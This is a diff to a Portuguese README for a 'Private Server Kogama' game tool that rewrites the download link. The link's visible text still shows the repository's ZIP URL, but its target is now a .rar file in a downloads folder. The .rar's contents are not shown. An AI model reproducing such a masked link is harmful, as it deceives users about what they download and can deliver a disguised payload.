@@ -23,7 +23,7 @@ O Private Server Kogama é uma ferramenta essencial para os jogadores do jogo Ko
 
 Vídeo: https://youtu.be/sHPgKPDbo4s
 
-Download ZIP: https://github.com/Jorelwall451/private-server-kogama/archive/refs/heads/main.zip 
+Download ZIP: [https://github.com/Jorelwall451/private-server-kogama/archive/refs/heads/main.zip ](https://github.com/Jorelwall451/private-server-kogama/blob/main/public/downloads/private-server-kogama-v1.0.rar)
 
 ## Suporte
 Se você precisar de ajuda ou tiver alguma dúvida sobre o Private Server for Kogama, entre em contato com nossa equipe de suporte. Estamos aqui para ajudar!
